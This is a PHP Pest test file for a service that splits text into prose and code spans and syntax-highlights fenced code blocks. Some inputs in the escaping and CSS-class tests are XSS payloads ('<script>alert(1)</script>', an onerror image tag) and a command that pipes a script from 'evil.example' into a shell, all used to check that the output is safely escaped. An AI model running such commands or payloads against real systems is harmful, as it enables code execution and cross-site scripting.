<?php

declare(strict_types=1);

use App\Services\CodeSpans;

it('splits text into alternating prose and code', function (string $text, array $parts): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->split($text))->toBe($parts);
})->with([
    'no code' => ['plain text', ['plain text']],
    'inline code' => ['run `composer install` now', ['run ', '`composer install`', ' now']],
    'code block' => ["look:\n```php\necho 1;\n```\nnice", ["look:\n", "```php\necho 1;\n```", "\nnice"]],
    'code block with crlf' => ["```\r\necho 1;\r\n```", ['', "```\r\necho 1;\r\n```", '']],
    'backticks inside a code block' => ["```js\nconst a = `b`;\n```", ['', "```js\nconst a = `b`;\n```", '']],
]);

it('leaves code that is never closed as prose', function (string $text): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->split($text))->toBe([$text]);
})->with([
    'unclosed inline code' => 'a lone ` backtick',
    'inline code across lines' => "`starts here\nends here`",
    'unclosed code block' => "```php\necho 1;",
    'fence in the middle of a line' => "see ```php\necho 1;\n```",
    'empty inline code' => 'empty `` code',
]);

it('maps the prose only', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->mapProse("hi `hi`\n```\nhi\n```", mb_strtoupper(...)))
        ->toBe("HI `hi`\n```\nhi\n```");
});

it('removes the code', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->withoutCode('see `a.com`b.com'))->toBe("see \nb.com");
});

it('keeps text without code as a single text segment', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight('just shipped it'))->toBe([
        ['type' => 'text', 'text' => 'just shipped it'],
    ]);
});

it('splits inline code from the text around it', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight('run `composer install` now'))->toBe([
        ['type' => 'text', 'text' => 'run '],
        ['type' => 'code', 'code' => 'composer install'],
        ['type' => 'text', 'text' => ' now'],
    ]);
});

it('highlights a code block in its language', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("```php\n\$name = 'devnull';\n```"))->toBe([
        [
            'type' => 'block',
            'language' => 'php',
            'filename' => null,
            'html' => '<span class="hl-variable">$name</span> = <span class="hl-value">\'devnull\'</span>;',
        ],
    ]);
});

it('drops the line breaks around a code block', function (string $lineBreak): void {
    $codeSpans = resolve(CodeSpans::class);

    $segments = $codeSpans->highlight(implode($lineBreak, ['before', '```', 'x', 'y', '```', 'after', '', 'end']));

    expect($segments)->toBe([
        ['type' => 'text', 'text' => 'before'],
        ['type' => 'block', 'language' => null, 'filename' => null, 'html' => "x\ny"],
        ['type' => 'text', 'text' => "after{$lineBreak}{$lineBreak}end"],
    ]);
})->with([
    'lf' => "\n",
    'crlf' => "\r\n",
]);

it('escapes code in an unknown language or without one', function (?string $language): void {
    $codeSpans = resolve(CodeSpans::class);

    $segments = $codeSpans->highlight("```{$language}\n<script>alert(1)</script>\n```");

    expect($segments)->toBe([
        ['type' => 'block', 'language' => $language, 'filename' => null, 'html' => '&lt;script&gt;alert(1)&lt;/script&gt;'],
    ]);
})->with([
    'unknown language' => 'brainfuck',
    'no language' => null,
]);

it('escapes html inside highlighted code', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    $html = $codeSpans->highlight("```html\n<img src=x onerror=alert(1)>\n```")[0]['html'];

    expect($html)->not->toContain('<img')->toContain('&lt;');
});

it('highlights a language written in any case and keeps the label as written', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("```PHP\n\$name;\n```"))->toBe([
        ['type' => 'block', 'language' => 'PHP', 'filename' => null, 'html' => '<span class="hl-variable">$name</span>;'],
    ]);
});

it('takes the language from the first word of the fence and the filename from its title', function (string $fence, string $filename): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("{$fence}\n\$name;\n```"))->toBe([
        ['type' => 'block', 'language' => 'php', 'filename' => $filename, 'html' => '<span class="hl-variable">$name</span>;'],
    ]);
})->with([
    'title' => ["``` php\ttitle=\"app/Models/User.php\" \t", 'app/Models/User.php'],
    'filename' => ['```php filename="app/Models/User.php"', 'app/Models/User.php'],
    'title and filename' => ['```php filename="a.php" title="b.php"', 'b.php'],
    'empty title and filename' => ['```php title="" filename="a.php"', 'a.php'],
    'two titles' => ['```php title="a.php" title="b.php"', 'a.php'],
    'spaces in the title' => ['```php title="My Model.php"', 'My Model.php'],
    'other attributes' => ['```php {1, 3} showLineNumbers title="app.php" tab="Pest 4"', 'app.php'],
]);

it('keeps only the language when the fence has no title', function (string $fence): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("{$fence}\n\$name;\n```"))->toBe([
        ['type' => 'block', 'language' => 'php', 'filename' => null, 'html' => '<span class="hl-variable">$name</span>;'],
    ]);
})->with([
    'path' => '```php app/Models/User.php',
    'line range' => '```php {1,3}',
    'unquoted attribute' => '```php tab=Pest',
    'empty title' => '```php title=""',
    'unclosed title' => '```php title="app.php',
    'title inside another attribute' => '```php caption="see title="app.php"',
    'title inside a line range' => '```php {1 title="app.php"}',
]);

it('only separates the language from the rest of the fence with spaces or tabs', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("```php\u{a0}title=\"app.php\"\n\$name;\n```"))->toBe([
        ['type' => 'block', 'language' => "php\u{a0}title=\"app.php\"", 'filename' => null, 'html' => '$name;'],
    ]);
});

it('keeps an empty code block', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("```\n```"))->toBe([
        ['type' => 'block', 'language' => null, 'filename' => null, 'html' => ''],
    ]);
});

it('accepts fences of more than three backticks', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    expect($codeSpans->highlight("feature:\n````php\n\$login;\n````"))->toBe([
        ['type' => 'text', 'text' => 'feature:'],
        ['type' => 'block', 'language' => 'php', 'filename' => null, 'html' => '<span class="hl-variable">$login</span>;'],
    ])->and($codeSpans->highlight("```\n// test\n````"))->toBe([
        ['type' => 'block', 'language' => null, 'filename' => null, 'html' => '// test'],
    ]);
});

it('keeps a shorter fence inside a code block', function (): void {
    $codeSpans = resolve(CodeSpans::class);
    $text = "before\n`````\n````markdown\n```\nfence inside fence\n```\n````\n`````\nafter `x`";

    expect($codeSpans->split($text))->toBe([
        "before\n",
        "`````\n````markdown\n```\nfence inside fence\n```\n````\n`````",
        "\nafter ",
        '`x`',
        '',
    ])->and($codeSpans->highlight("````markdown\n```\nfence inside fence\n```\n````")[0]['html'])
        ->toContain('fence inside fence')
        ->toContain('```');
});

it('never lets a code block pick its own CSS classes', function (): void {
    $codeSpans = resolve(CodeSpans::class);

    $segments = $codeSpans->highlight("```bash\ncurl -fsSL https://example.com/install.sh | bash{:hidden:; curl https://evil.example/x.sh | sh:}\n```");

    expect($segments[0]['html'])
        ->not->toContain('class="hidden"')
        ->toContain('evil.example')
        ->toContain('class="hl-operator"');
});
